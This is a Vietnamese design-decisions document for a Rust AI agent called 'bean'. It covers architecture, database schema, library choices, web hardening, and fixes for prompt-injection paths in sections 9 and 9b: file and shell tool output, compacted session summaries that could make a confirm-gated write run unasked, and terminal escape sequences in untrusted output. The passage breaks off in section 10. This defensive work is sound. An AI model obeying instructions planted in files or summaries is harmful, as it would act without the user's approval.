# Quyết định thiết kế (bổ sung/giải thích cho `agents.md`)

> **Ghi chú đổi tên (2026-09-28).** Đổi tên `BeanAgent`/`beanagent-*` → `bean`/`bean-*` trên
> toàn repo. Mục **19 (D18.x)** ghi quyết định mới; **D5.13 được giữ nguyên lập luận gốc**
> kèm khối "Đã thay thế bởi rename" ngay bên dưới — không viết đè lịch sử quyết định.
> Tag `pre-rename-beanagent` giữ trạng thái commit gốc cho mọi tài liệu lịch sử.

File này ghi lại các điểm mà `agents.md` còn mơ hồ, mâu thuẫn hoặc thiếu, kèm quyết định
đã chốt và lý do. Người dùng đã uỷ quyền cho coding agent tự chốt các điểm này (2026-09-21).
Khi `agents.md` được cập nhật, mục tương ứng ở đây chuyển sang trạng thái "đã vào spec".

* Xem thêm `docs/known-issues.md`: **quyết định của chủ dự án** (đã chốt, không tự ý đổi),
  **điểm yếu đã biết cần khắc phục** và mẹo kiểm thử môi trường.

---

## 1. Kiến trúc Router / Run / RunIo (agents.md mục 6, 10)

* **D1.1 — Run thuộc Router.** `Router::submit()` trả `RunId` ngay và spawn task nền. Kênh
  (CLI/web/Telegram) **không** gọi `run_turn()`; kênh chỉ `submit` + hiển thị `RunEvent`.
* **D1.2 — `RunIo` do Router sở hữu, không mượn theo kết nối.** Trait là
  `RunIo: Send + Sync + 'static`; agent loop nhận `Arc<dyn RunIo>`. Lý do: mục 10 yêu cầu run
  sống qua việc rớt WebSocket, nên không thể mượn `&dyn RunIo` gắn với kết nối.
  * M3: CLI tự implement `RunIo` (in ra terminal, hỏi y/n).
  * M8: Router cung cấp `RouterIo` cùng trait — `on_*` phát `RunEvent` lên broadcast,
    `confirm()` sinh `confirm_id`, phát `ConfirmRequest`, chờ `oneshot` với `timeout_seconds`,
    hết hạn ⇒ `DENY`.
* **D1.3 — Một enum sự kiện duy nhất.** `RunEvent` (định nghĩa ở `bean-types`) luôn mang
  `session_id`, `run_id`, và `message_id` khi có. `bean-web` chỉ **map** 1-1 sang `ServerMsg`
  (thêm trường `type` cho TS); không định nghĩa hai enum song song gần giống nhau.
* **D1.4 — `Incoming` có `session_id: Option<SessionId>`.** Web: mỗi hội thoại = 1 session = 1
  `chat_id` (uuid). `session_id = None` ⇒ resolve theo `(channel, chat_id)` như mục 8.1
  (CLI/Telegram). Nếu có `session_id`, Router phải kiểm tra session đó thuộc đúng
  `channel`/`chat_id`/`user_id` trước khi dùng (chống IDOR).
* **D1.5 — Web là một `Channel`.** `bean-web::WebChannel`: `run()` = chạy axum server và chờ
  `shutdown`; `send(chat_id, Outbound)` = broadcast `Notification` tới mọi kết nối WS.
  Router giữ registry `HashMap<&'static str, Arc<dyn Channel>>` (`register_channel`).
* **D1.6 — `Outbound` có kiểu** `{ session_id, message_id, text, kind }`. Kênh đẩy (Telegram)
  dùng bảng `outbox` để thử lại; **web không cần retry** vì tin đã nằm trong DB và UI nạp lại
  bằng REST — ghi rõ như vậy để tránh implement retry vô nghĩa.
* **D1.7 — "Cho phép trong phiên"** lưu **trong RAM theo `(session_id, tool_name)`**, không ghi
  DB; xoá khi `/new`, khi restart, và bị veto trong lượt nếu đã đọc `<untrusted_content>` (15.4).
* **D1.8 — Ngưỡng output tool (3 mức khác nhau)**: lưu DB tối đa **1 MiB** (quá thì cắt + ghi chú),
  gửi model tối đa **20.000 ký tự** tại ranh giới UTF-8, preview UI **2.000 ký tự**.
  Nhờ vậy `GET /api/messages/:id` thật sự có nội dung đầy đủ để hiển thị.

## 2. Bổ sung schema SQLite (agents.md mục 8.1)

* **D2.1** Thêm `usage(day TEXT PRIMARY KEY, input_tokens INTEGER NOT NULL, output_tokens INTEGER NOT NULL)`
  — mục 15.9 yêu cầu ngân sách token/ngày nhưng schema cũ không có chỗ đếm.
* **D2.2** `outbox` thêm `next_attempt_at TEXT NOT NULL`, `last_error TEXT NOT NULL DEFAULT ''`
  (index theo `next_attempt_at`) để "thử lại có backoff" khả thi.
* **D2.3** `scheduled_tasks` thêm `session_id INTEGER REFERENCES sessions(id)`, `created_at`,
  `last_run_at`, `last_status` (mục 14 nói "chạy agent trong session của task").
* **D2.4** `web_sessions` thêm `user_id TEXT NOT NULL DEFAULT 'web:admin'` để audit/`/api/auth/me`
  có định danh (v1 một người dùng).
* **D2.5** `messages.seq` do **một writer duy nhất** cấp (`MAX(seq)+1` trong cùng transaction).
* **D2.6** FTS5: dùng `unicode61 remove_diacritics 2` cho `messages_fts`/`memories_fts`
  (tìm được cả khi người dùng gõ không dấu); phải có đủ 3 trigger `ai/ad/au` và lệnh
  `INSERT INTO <fts>(<fts>) VALUES('rebuild')` dùng khi migration/restore.

## 3. Lựa chọn thư viện (agents.md mục 3.1, 3.2) — đã kiểm tra docs/source ngày 2026-09-21

* **D3.1** `reqwest 0.13`: `rustls` là backend **mặc định** (feature TLS tên là `rustls`, không còn
  `rustls-tls`); `query`/`form` không còn bật mặc định ⇒ khai báo tường minh `features = ["json"]`
  (+ `stream` khi làm M17).
* **D3.2** `argon2 0.6` (API khác 0.5): dùng `Argon2::default().hash_password(pw)?` +
  `PasswordHash::new(&phc)`; feature mặc định đã gồm `password-hash` + `getrandom`.
* **D3.3** `teloxide 0.17`: **tắt default features** (`native-tls`) và bật
  `["rustls", "rustls-native-roots", "macros", "throttle"]` để không kéo OpenSSL.
* **D3.4** **M14:** `rmcp 3.4.1` (Cargo range `3.4.0`, lockfile chốt 3.4.1), chỉ bật
  `default-features = false` + `["client", "transport-child-process"]`. API đã đối chiếu source
  crate đã tải: `TokioChildProcess::new`, `ServiceExt::serve`, `Peer::list_all_tools`,
  `RunningService::call_tool_once`, `CallToolRequestParams`; không dùng server/macros/HTTP của
  `rmcp`. `TokioChildProcess` tự kill/reap khi drop; Bean vẫn gọi `close_with_timeout`
  tường minh khi `chat`/`serve` thoát.
* **D3.5** `tower-http 0.7` (+ `csrf` layer làm lớp phụ cho mục 15.7, và `services::fs::Backend`
  để phục vụ asset nhúng ở M9).
* **D3.6** DB: `tokio-rusqlite 0.8` (forward feature `bundled` sang `rusqlite 0.40`).
  `rusqlite` `bundled` **đã có FTS5** (`libsqlite3-sys` bật `SQLITE_ENABLE_FTS5`) — không cần
  feature riêng.
* **D3.7** Cron: `croner 4` (có `.describe()` cho UI màn Tác vụ).
* **D3.8** Frontmatter của skill: **tự parse 2 trường** `name`/`description` (không dùng `serde_yaml`
  — repo dtolnay/serde-yaml đã archived; `serde_yaml_ng`/`serde_norway` là phương án dự phòng).
* **D3.9** Cấu hình dùng `toml 1.1` (đã là major v1).
* **D3.10** Web: TypeScript **7** (native, vẫn cung cấp `tsc`), Vite **8** (Rolldown/Oxc;
  `build.rolldownOptions` thay `build.rollupOptions`), React 19.3, react-router **8**,
  Vitest **5** (`test.projects` thay "workspace"), Tailwind **4.3** (`@tailwindcss/vite`,
  không có `tailwind.config.js`), shadcn CLI 4.
* **D3.11** Highlight code: **highlight.js** (class-based, không sinh inline style) thay vì shiki
  (sinh `style="…"` inline) — M10 dùng.
* **D3.12** i18n: **từ điển tự viết** (`web/src/i18n/{vi,en}.ts`), không dùng react-i18next.
* **D3.13** pnpm **11**: `onlyBuiltDependencies` đã bị xoá; dùng map **`allowBuilds`** trong
  `web/pnpm-workspace.yaml`, `strictDepBuilds: true` (mặc định) ⇒ dependency có build script phải
  được duyệt tường minh.

## 4. Web server / an toàn UI (agents.md mục 11, 12, 15.7)

* **D4.1** CSP giữ `default-src 'self'`, nhưng cho phép `style-src 'self' 'unsafe-inline'`
  (Tailwind v4/HMR và một số component sinh style inline; không nới thì UI không render đúng).
  `script-src 'self'` không nới; `img-src 'self' data:`; ghi comment nêu lý do trong code M9.
* **D4.2** CSRF: yêu cầu `Content-Type: application/json` + kiểm tra `Origin`/`Host` với mọi request
  thay đổi dữ liệu, **thêm** `tower_http::csrf::CsrfLayer` làm lớp phụ.
* **D4.3** Giới hạn tần suất đăng nhập theo **peer IP** (`ConnectInfo<SocketAddr>`); chỉ tin
  `X-Forwarded-For`/`X-Real-IP` khi `web.trust_proxy = true`.
* **D4.4** `ClientMsg::Start.text` tối đa 64 KB; vượt ⇒ `Error{code:"payload_too_large"}`.
* **D4.5** UI khử trùng theo `message_id`/`run_id`: lịch sử luôn lấy từ REST, `Sync` để khôi phục
  run/confirm đang chạy; event đến sau khi REST đã nạp thì bỏ qua theo `message_id`.
* **D4.6** `serve` từ chối bật web nếu chưa có `data.dir/auth.toml` (đặt bằng
  `bean auth set-password`: hash `argon2id`, file quyền `0600`).

## 5. Nhỏ nhưng cần chốt để không tự suy diễn

* **D5.1** Tên file spec trong repo này là `agents.md` (chữ thường).
* **D5.2** `make types` ở M1 là placeholder: chưa có kiểu API nào; từ M9 target này chạy
  `cargo test --workspace export_bindings` với `TS_RS_EXPORT_DIR=web/src/api/generated`
  (đặt trong `.cargo/config.toml`), và `make check-rust` so `git diff --exit-code` trên thư mục đó.
* **D5.3** `cargo build --no-default-features` chạy ở gốc workspace nhờ
  `default-members = ["crates/bean"]`.
* **D5.4** `run_turn()` trả `RunOutcome { text, ended: EndReason }` với
  `EndReason::{Final, MaxSteps, Cancelled, BudgetExceeded, LoopGuard}` (mục 6 chỉ trả `String`,
  không phân biệt được lý do dừng để UI/Telegram thông báo cho đúng).
* **D5.5** Chống lặp so sánh **JSON đã chuẩn hoá** (sort khoá) của `(tool, args)`.
* **D5.6** `allowed_users` bị kiểm tra **trước** khi tạo session/ghi message; chỉ log warn.
* **D5.7** `/model` chỉ đổi trong runtime, áp dụng cho run kế tiếp, không ghi vào `bean.toml`.
* **D5.8** Hai chỗ dùng múi giờ khác nhau: `agent.timezone` cho **parse cron/hiển thị phía server**;
  UI luôn hiển thị theo múi giờ trình duyệt.
* **D5.9** `Risk` được định nghĩa ở `bean-types` (mục 7.1 đặt ở `bean-tools`) để
  `tools`, `core` và `web` dùng chung một kiểu; `bean-tools` re-export lại.
* **D5.10** `bean.toml` dùng `#[serde(deny_unknown_fields)]` để bắt lỗi gõ sai khoá; khoá thêm
  ngoài mục 18 (`web.trust_proxy`) đều có `#[serde(default)]` và nằm trong file mẫu dạng comment.
* **D5.11** `chat` chạy được **không cần** `bean.toml` (dùng giá trị mặc định, có cảnh báo)
  để `cargo run -p bean -- chat` là lệnh smoke test của M1.
* **D5.12** Mọi crate: `#![forbid(unsafe_code)]`; clippy `unwrap_used`/`expect_used`/`panic`/`todo`
  = `deny` ở `[workspace.lints]`; file test được phép dùng `unwrap`/`panic` qua `#![allow(...)]`
  ở đầu file.
* **D5.13** Tên **package** của các crate thư viện là kebab-case chữ thường (`bean-types`,
  `bean-llm`, …) và thư mục cũng vậy (`crates/bean-types`), vì Rust dùng tên package
  làm tên crate trong code: `bean-types` sẽ buộc phải viết `bean_types::…` (không
  idiomatic). Package của binary vẫn là `bean` (để `cargo run -p bean -- chat` và tên
  file binary là `bean`), và `[[bin]] name = "bean"` được khai báo tường minh.
  Đây là sai khác nhỏ so với sơ đồ mục 4 của `agents.md` (chỉ khác chữ hoa/thường).

  > **Đã thay thế bởi rename 2026-09-28 — xem D18.x (mục 19).**
  > Đoạn lập luận trên được giữ nguyên theo nguyên tắc "không viết đè lịch sử": nó mô tả
  > trạng thái *trước* khi đổi tên, khi package của binary còn là `BeanAgent` (CamelCase).
  > Rename M28 đã đổi cả package lẫn tên binary sang chữ thường `bean`; phần "sai khác
  > nhỏ so với sơ đồ mục 4" **không còn tồn tại** vì nay khớp hẳn với sơ đồ.
  > Lý do gốc (kebab-case để import `bean_types::…` idiomatic) vẫn nguyên hiệu lực.

## 6. Quyết định riêng của M2 (providers)

* **D6.1** Mỗi lượt `LlmProvider::chat` phát đúng **một** HTTP request; retry/backoff nằm ở
  `bean_llm::retry::retry_with_backoff` (tối đa 3 lần, tôn trọng `Retry-After` giây,
  backoff 1s→2s→4s + jitter ≤ 25%) **bọc ngoài** closure request, không nằm trong provider.
  Lý do: test đo được số request qua wiremock, và M17 (streaming) không phải nhân bản logic.
* **D6.2** `reqwest` giữ backend mặc định rustls (0.13: rustls là default; **không** khai
  feature `rustls-tls` — feature này đã đổi tên ở 0.13, khai sai sẽ fail build). Chỉ thêm
  feature `json`. Timeout tổng 300s, connect 30s, User-Agent `bean/<version>`.
* **D6.3** `LlmError::HttpStatus` nhúng tối đa **500 ký tự** body lỗi (cắt theo ranh giới
  ký tự, không cắt giữa codepoint). Body lỗi không log ở mức info; chỉ đi vào `Display`
  của lỗi khi hiện cho người dùng (CLI) hoặc trả về client ở M9.
* **D6.4** OpenAI-compat gửi `max_tokens` (trường kinh điển). Không gửi
  `max_completion_tokens` đồng thời vì OpenAI từ chối request khi có cả hai; các server
  compat (Ollama/vLLM) hiểu `max_tokens`. Khi cần đổi, chỉ sửa một chỗ duy nhất
  (`openai_compat::build_request_body`).
* **D6.5** `openai_compat`: API key **tuỳ chọn** khi có `llm.base_url` (Ollama/vLLM không
  cần key). Thiếu key mà không có `base_url` (mặc định trỏ tới OpenAI chính thức) là lỗi
  cấu hình rõ ràng ngay khi dựng provider, không phải lỗi lúc gọi API.
* **D6.6** `tool_calls[].function.arguments` của OpenAI-compat: parse **dung nham** — chuỗi
  JSON (chuẩn), chuỗi rỗng → `{}`, object (server lệch chuẩn) → dùng nguyên; còn lại là
  `LlmError::Decode` (agent loop ở M3 sẽ biến thành message lỗi cho model).
* **D6.7** Anthropic: nhiều `Role::Tool` **liên tiếp** được gộp thành **một** message `user`
  chứa nhiều block `tool_result` (định dạng đúng cho tool call song song của Messages API);
  gặp message role khác thì flush trước. Assistant "rỗng" được chèn block text `""` vì
  Anthropic từ chối `content: []`.
* **D6.8** `Retry-After` chỉ hỗ trợ dạng **số giây**; HTTP-date bị bỏ qua (log debug) — cả
  Anthropic lẫn OpenAI đều dùng số giây, còn HTTP-date cần crate phân tích ngày riêng.
* **D6.9** Jitter của backoff dựa nano-giây đồng hồ hệ thống (không kéo crate `rand` vào
  crate llm chỉ cho jitter); `rand`/`subtle` vẫn được thêm ở M9 cho token phiên.
* **D6.10** `schemars` (M3) sinh draft 2020-12 với `$defs`/`$ref`; hai provider đều chạy
  `schema::sanitize_tool_schema` trước khi gửi: inline `$ref` (trần độ sâu 16 chống đệ
  quy), xoá `$schema`/`$defs`/`$id`, bảo đảm root `"type":"object"` (Anthropic yêu cầu).


---

## 7. Quyết định riêng của M3 (tools + agent loop)

* **D7.1** Path jail đặt sau trait `WorkspaceFs` (`bean_tools::workspace`): M3 dùng
  `FsWorkspace` với kiểm tra đơn giản (chặn đường dẫn tuyệt đối, thành phần `..`, và
  symlink thoát ra qua `canonicalize` + kiểm tra prefix). M4 thay bằng `cap-std::fs::Dir`
  — chỉ cài lại trait này, tool và agent loop không đổi.
* **D7.2** Chống lặp (mục 6): đếm thất bại theo cặp `(tool, hash tham số)`. Hai lần
  thất bại giống nhau liên tiếp → chèn gợi ý `[Gợi ý] ... hãy thử cách khác.` vào chính
  tool result (model đọc được). Lần thứ ba gọi lại đúng cặp đó → ghi tool result lỗi và
  kết thúc run với `AgentError::RepeatFailure`. Gọi tool khác hoặc thành công thì reset.
* **D7.3** Huỷ giữa chừng: `tokio::select!` (nhánh `biased` ưu tiên cancel) đua
  `timeout(tool_timeout) · execute_tool` với `cancel.cancelled()`. Khi huỷ, tool result
  `"[bị người dùng huỷ]"` vẫn được ghi sau khi select hoàn tất (cancel-safety, mục 22.10)
  rồi run kết thúc bằng `AgentError::Cancelled`.
* **D7.4** `ToolSpec::new(name, description, parameters)` — JSON schema thô từ schemars;
  việc chuẩn hoá là trách nhiệm của provider (D6.10).
* **D7.5** `MemoryStore` (`bean-core::store`): in-memory; `history(session, before,
  limit)` trả message cũ → mới, tối đa `limit` message gần nhất (`before` = chỉ lấy
  trước seq đó, `limit = 0` = không giới hạn). SQLite thay ở M5, giữ nguyên trait `Store`.
* **D7.6** System prompt (M3) theo mẫu mục 19 nhưng mục Skills/Memory để trống —
  `system_prompt(agent_cfg, skills_index, memory_md, user_md)`; M5/M6 chỉ truyền nội dung.
* **D7.7** Confirm trên CLI: prompt `Cho phép? (y/n/s)` (`s` = cho phép trong phiên);
  nhập khác/trống/EOF = từ chối. Timeout 300s hardcode ở M3 — Router (M8) sẽ quản lý
  `confirm_id`/timeout thật.
* **D7.8** Trạng thái demo model thật của M3: chưa chạy được trong môi trường build
  (không có API key nào trong env, không có Ollama local). Đã xác minh thiếu key → lỗi
  cấu hình rõ ràng, thoát sạch. Demo `--fake-llm` (kịch bản `tests/e2e/demo_hello.json`:
  write_file → confirm → read_file) chạy đúng; người dùng cần tự chạy lại với key thật.

---

## 8. Quyết định riêng của M5 (bộ nhớ: SQLite + FTS5)

* **D8.1** FTS5 **không** phải feature của `rusqlite`: `libsqlite3-sys 0.38.2` đã bật
  `-DSQLITE_ENABLE_FTS5` sẵn ở chế độ `bundled` (xác nhận trong
  `libsqlite3-sys-0.38.2/build.rs`, dòng 157–160). Vì vậy **không** cần `SQLITE3_CFLAGS`
  hay `LIBSQLITE3_FLAGS` trong Makefile/`.cargo/config.toml`; nếu bản build tương lai bỏ
  cờ này thì migration báo lỗi rõ "thiếu FTS5 trong SQLite?".
* **D8.2** **Một** thread riêng (`bean-memory-worker`) sở hữu `rusqlite::Connection`
  duy nhất: `SqliteStore::open` tạo connection, chạy pragma + migration **đồng bộ**, rồi
  spawn worker; mọi thao tác đi qua `std::sync::mpsc::Sender<DbCommand>` + `oneshot` trả
  kết quả. Lý do: `rusqlite` blocking (mục 22.8) và SQLite ghi tốt nhất với một writer.
  `Drop for SqliteInner` đóng kênh rồi `join()` để WAL được flush trước khi tiến trình
  thoát (test `sqlite_persists_messages_across_restart` kiểm chứng).
* **D8.3** `messages.seq` được cấp trong **chính** câu `INSERT`
  (`SELECT COALESCE(MAX(seq),0)+1 …`) nên không có khe hở tranh chấp mà vẫn chỉ một câu
  lệnh (atomic).
* **D8.4** FTS5 dùng `tokenize = "unicode61 remove_diacritics 2"`: gõ `bao cao` vẫn tìm ra
  `báo cáo` (tiếng Việt — mục 8.4). Query là đầu vào **không tin cậy** nên
  `sanitize_fts_query` chỉ giữ chữ-số/`_`, bọc từng từ trong `"…"`, và trả rỗng khi không
  còn từ khoá — cú pháp FTS không thể bị phá.
* **D8.5** BM25 phụ thuộc **kích thước bảng** (bảng 1 dòng ⇒ IDF ≈ 0 ⇒ điểm rất nhỏ), nên
  điểm được **chuẩn hoá theo từng nguồn** trước khi trộn `memories` + `messages`:
  `1.0` = liên quan nhất của nguồn đó; bằng điểm thì ghi nhớ dài hạn đứng trước (sort ổn
  định).
* **D8.6** Compaction: kích hoạt khi `chars/4 > 70%` của `agent.context_budget_tokens`
  (`sessions.summary` cũ được đưa vào prompt để bản mới gộp cả hai), cắt ở message `User`
  đầu tiên trong `K = 20` message cuối (`safe_cut::find_compaction_start`) — thoả **cả hai**
  yêu cầu của mục 8.3 (ranh giới `User` **và** không tách cặp tool). Không tìm được ranh
  giới an toàn ⇒ giữ nguyên lịch sử.
* **D8.7** Compaction là **best-effort**: lỗi gọi LLM để tóm tắt (mạng, quota, hết ngân
  sách) chỉ ghi `tracing::warn` và bỏ qua — không bao giờ làm hỏng run đang chạy.
* **D8.8** `MemoryStore` (in-memory) vẫn được giữ và **cùng** trait `Store` để test M3
  không phải đổi: test vòng lặp ghi thẳng `SessionId::new(1)` nên `append` tự tạo phiên và
  `history` trả rỗng cho phiên chưa biết (thay vì `NotFound`). `SqliteStore` là bản dùng
  thật ở `bean chat`; CLI bọc nó trong `Arc` để chia sẻ với tool bộ nhớ.
* **D8.9** Context builder (mục 8.2) đặt ở `bean-core::context::build(store, config,
  session, workspace)` vì cần `WorkspaceFs` để đọc `MEMORY.md`/`USER.md` qua path jail
  (không tự nối đường dẫn). Ngân sách ở điểm 3 của mục 8.2 tính **riêng** cho lịch sử
  (`context_budget_tokens`), không trừ system prompt; message mới nhất luôn được giữ, và
  điểm cắt lùi thêm (`safe_cut::extend_start_backwards`) nếu cần để không tách cặp tool.
* **D8.10** System prompt chỉ đi qua `ChatRequest.system`; **không** nhân bản thành message
  `User` nữa (`system_to_messages` từ M3 đã bỏ). Lý do: M3 gửi trùng nên tốn token gấp đôi
  cho phần system — M5 lại nhồi thêm tới 8.000 ký tự `MEMORY.md`/`USER.md` vào đó — và model
  dễ hiểu nhầm system prompt là câu lệnh của người dùng; mục 8.2 cũng chỉ yêu cầu system ở
  đúng chỗ đó. Vì Anthropic từ chối `messages: []`, `run_turn` giữ một lưới an toàn: lịch sử
  rỗng thì gửi lại tin người dùng của lượt đó. Test hồi quy:
  `system_prompt_is_sent_once_via_system_field` trong `core/tests/agent_loop.rs`.

---

## 9. Quyết định riêng của lượt vá S1 (mục 15.4 — nội dung không tin cậy)

Bối cảnh: `docs/security-review.md` mục 2 (S1) chứng minh `read_file`/`grep`/`glob`/
`list_dir` và output `run_shell` trả văn bản thô, nên cờ `untrusted_seen` không bao giờ
được bật trong lượt chỉ dùng đọc file ⇒ mất hoàn toàn lớp phòng thủ "cho phép trong phiên".

* **D9.1 — `Tool::marks_untrusted()`: khai báo tường minh thay cho quy ước ngầm "tool tự
  bọc".** Trước đây agent loop suy luận "tool này có bọc không?" bằng cách dò thẻ mở
  trong output (`contains_untrusted_block`) — logic phụ thuộc vào hành vi bên trong tool
  nên dễ quên và hỏng **âm thầm**. Nay trait `Tool` có method có giá trị mặc định:
  ```rust
  fn marks_untrusted(&self) -> bool { false }
  ```
  và agent loop bật cờ theo **khai báo**, cộng thêm `contains_untrusted_block` làm lưới
  an toàn thứ hai (giữ nguyên để tool tự bọc tay như `web_fetch`/MCP vẫn an toàn kể cả
  nhánh lỗi).

  **Đánh đổi so với quy ước cũ:**
  * *Thêm* một method vào trait `Tool` — về mặt kỹ thuật là thay đổi phá vỡ cho implementor
    bên ngoài, nhưng **có default body** nên không implementor nào (kể cả `FlexTool` trong
    test) phải sửa; chỉ tool mới muốn khai untrusted mới cần override.
  * **Không** đổi tool schema gửi model (`make types` xác nhận không có diff) và **không**
    ảnh hưởng UI.
  * Đổi lại: tool mới quên bọc sẽ bị **test hồi quy** bắt (danh sách tường minh trong
    `security/tests/untrusted_tools.rs::every_external_source_tool_declares_marks_untrusted`)
    thay vì hỏng lặng lẽ.

* **D9.2 — Hai builder trên `TypedTool`.** `.untrusted()` = khai báo **và** tự bọc output
  bằng `untrusted::wrap_bounded` + bật cờ (dùng cho file và `run_shell` — tác giả không
  thể quên một trong hai việc). `.declares_untrusted()` = **chỉ** khai báo, dùng cho
  `web_fetch`/`web_search` vì chúng đã tự bọc bằng `wrap_untrusted_limited` (kể cả nhánh
  lỗi) — tránh bọc hai lần.

* **D9.3 — `wrap_bounded` + trần 19.000.** Hàm bọc dùng chung đặt trần nhỏ hơn trần 20.000
  của agent loop để `truncate_output` không cắt mất `</untrusted_content>`. Thuật toán cắt
  **không viết mới**: vẫn gọi `text::truncate_chars` ⇒ không bao giờ cắt giữa codepoint
  (mục 22.9).

* **D9.4 — `list_dir`/`glob` cũng bật cờ (an toàn hơn là để sót).** Tên file/thư mục hiếm khi
  chứa chỉ dẫn thực thi, nhưng tên file **là** dữ liệu kẻ tấn công kiểm soát được
  (`README.md`, `.git/hooks/…`). Giá bật cờ chỉ là mất tiện lợi "cho phép trong phiên" sau
  khi liệt kê thư mục — rẻ hơn nhiều so với việc để sót một đường injection.

* **D9.5 — `write_file`/`edit_file`/`memory_*` **không** bọc.** Chúng chỉ trả thông báo do
  chính agent tạo, không mang nội dung ngoài; bọc thừa làm loãng ngữ cảnh và làm mất ý
  nghĩa của thẻ. Test `write_file_output_is_not_wrapped` chốt hành vi này.

* **D9.6 — K1 (`sessions.summary`) tách riêng khỏi lượt vá S1.** Cùng lớp lỗi nhưng đi
  đường khác (`context.rs` chèn summary vào system prompt, không liên quan registry/tool).

---

## 9b. Quyết định riêng của lượt vá K1 + S2 (2026-09-27)

Bối cảnh: `docs/security-review.md` mục 3.1 (K1) và mục 3.2 (S2). K1 là **cùng lớp lỗi với
S1** nhưng đi đường khác: S1 là output tool trong *một lượt*, K1 là dữ liệu nằm trong *mọi
lượt* của một phiên đã compact.

* **D9.7 — K1: bọc summary trong `<untrusted_content>` **và** bật `untrusted_seen` khi
  context có summary.** `context.rs` dùng lại `untrusted::wrap_bounded` (D9.2/D9.3) —
  không viết thuật toán bọc mới — và trả về thêm cờ `TurnContext::summary_present`;
  `agent.rs` bật `untrusted_seen` ngay từ đầu lượt khi cờ này bật.

  **Vì sao bắt buộc phải bật cờ, không chỉ bọc thẻ.** Mục 15.4 quy định **hai điều kiện
  kèm nhau**: bọc thẻ *và* bật cờ. Bọc thẻ một mình là *soft control* (model có thể vẫn
  chọn tin theo chỉ dẫn nằm trong khối), còn cờ mới là *hard control* ở tầng `Policy` —
  nó chặn hành vi độc lập với việc model có ngoan hay không. Bỏ chỉ bọc thẻ còn làm hỏng
  chính lớp phòng thủ của hệ thống: nó dạy lại đội ngũ rằng "đã bọc là an toàn", đúng cái
  bẫy đã gây ra S1. Về mặt kiểm chứng: khi bỏ đúng ba dòng bật cờ, test
  `summary_injection_forces_reconfirmation_of_confirm_tool` **fail** với `confirms: []` —
  tức `write_file` chạy thẳng không hỏi, đúng kịch bản khai thác.

  **Phương án bị loại: đưa summary ra khỏi system prompt** (thành message `User` ở đầu
  lịch sử). Có hai vấn đề: (1) nó **không giúp test đạt** — vẫn phải bật cờ, nên mất đánh
  đổi UX mà không đổi hành vi policy; (2) nó tự tạo rủi ro mới: message `User` tổng hợp
  dễ bị model hiểu là *người dùng vừa nói câu đó* — tức lại là một đường leo đặc quyền,
  chỉ khác hình thức. Nó còn phải đi quanh `safe_cut`/`trim_history` (chỗ dễ hỏng nhất của
  codebase, mục 22.1) và đụng ngữ nghĩa ngân sách token (D8.6/D8.9). Không vi phạm Q1
  (D8.10) vì đây là dữ liệu tóm tắt, không phải bản sao system prompt.

  **Đánh đổi đã được chủ dự án xác nhận chấp nhận (2026-09-27):** phiên đã compact mất
  tuỳ chọn "cho phép trong phiên" cho tool `Confirm`/`Dangerous` cho tới hết phiên đó.
  Vì `untrusted_seen` được tạo mới ở **mọi** `run_turn`, đây là mọi lượt sau lần compact
  đầu — không chỉ một lượt. Lý do chấp nhận: phiên càng dài thì càng nhiều nội dung đã
  chảy qua nó (web, MCP, file đọc được), nên xác suất chứa chỉ dẫn dẫn dắt **cao hơn**;
  thận trọng hơn ở đúng chỗ đó là hợp lý. Hệ quả bị ghi nhận: `no_summary_means_flag_stays_off`
  bảo đảm phiên chưa compact **không** bị bật cờ oan — nếu không, vá K1 sẽ phá UX của
  toàn hệ thống chứ không chỉ của phiên đã compact.
  Hướng tinh giản nếu sau này thấy mỏi tay: xem backlog `K1-followup` trong
  `docs/known-issues.md`.

* **D9.8 — S2: lọc escape ở `bean_tools::text::strip_terminal_escapes`, áp dụng theo
  khai báo `marks_untrusted()`.** Một điểm dùng chung duy nhất (không lọc rải rác), và CLI
  lấy danh sách tool untrusted từ **chính khai báo D9.1** lúc khởi động ⇒ không có danh sách
  tool thứ hai phải đồng bộ, thêm tool mới tự động được lọc.
  `render_event` đổi từ `println!` sang nhận `&mut dyn Write` **để test được trên buffer
  thật** — không thể assert "đã in ra terminal" mà không cần terminal thật.

  **Vì sao nuốt trọn chuỗi escape chứ không chỉ bỏ ký tự `ESC`:** bỏ mỗi `ESC` đi sẽ để
  lại phần thân (`]52;c;Y3VjdG9y`, `[2J`) lọt ra dưới dạng chữ thường vô nghĩa. Terminal
  chỉ diễn giải chuỗi bắt đầu bằng `ESC`/C1 nên bỏ `ESC` đã đủ an toàn về mặt kỹ thuật, nhưng
  nuốt trọn vừa sạch hơn vừa tránh hiển thị rác. Bộ lọc **giữ `\n`/`\t`** để output nhiều
  dòng vẫn đọc được, và **giữ nguyên mọi chữ thường** — bao gồm cả `[`/`]` không đi kèm
  `ESC` (output `cargo` có nhiều).

  **Không lọc thừa:** tool không untrusted (`write_file` chỉ trả thông báo do agent tự tạo —
  D9.5) giữ nguyên hành vi cũ; test `trusted_tool_output_is_not_filtered` cố tình đưa chuỗi
  escape vào output của tool đó để chứng minh bộ lọc **không** chạy.

## 10. Kênh chat (D10.x)

* **D10.1 — Bỏ hẳn Discord/Slack/WhatsApp; Telegram + web là bộ kênh cuối cùng (2026-09-26).**
  Chủ dự án quyết bỏ Discord để giữ hệ thống đơn giản. Trước khi quyết định, đã khảo sát 44 bất
  biến mà adapter Telegram đang đảm bảo; kết luận:
  * **Discord không có tín hiệu API chặn trùng token.** Telegram trả `409 Conflict`
    (`ApiError::TerminatedByOtherGetUpdates`) nên D3 chặn được bằng tín hiệu máy chủ. Discord
    **cho phép nhiều shard với cùng token** ⇒ muốn giữ bất biến "một token/instance" phải tự
    viết cơ chế claim (ví dụ heartbeat trên đĩa), tức thêm bề mặt lỗi chỉ để thêm một kênh chat.
  * **Vòng đời interaction khác hẳn.** Discord bắt buộc trả lời interaction trong **3 giây** nếu
    không `defer`, và interaction **hết hạn ~15 phút**. Telegram không có hai ràng buộc này vì
    Router tự quản lý hết hạn 300s. Sẽ phải thêm cơ chế `defer` + dọn rác TTL cho bảng confirm.
  * **Chi phí port lại lớn.** Phải port ~44 bất biến (allowlist 2 lớp, chống giả mạo callback,
    dedup, rate limit, confirm 3 nút, backoff luỹ thừa, redact secret…) mà M18 vốn đã ghi
    *"tuỳ chọn, chỉ làm nếu rẻ"* và chưa từng có nhu cầu vận hành thực tế.
  * **Hệ quả:** roadmap còn `M21 → M22 → M22a → M23 → M24` (`Plan.md` mục 5.0). Không milestone
    nào phụ thuộc Discord nên việc loại bỏ không ảnh hưởng phạm vi công việc đang dở.
  * **Bài học để lại:** mọi bất biến an toàn của một adapter **không tự động portable sang nền
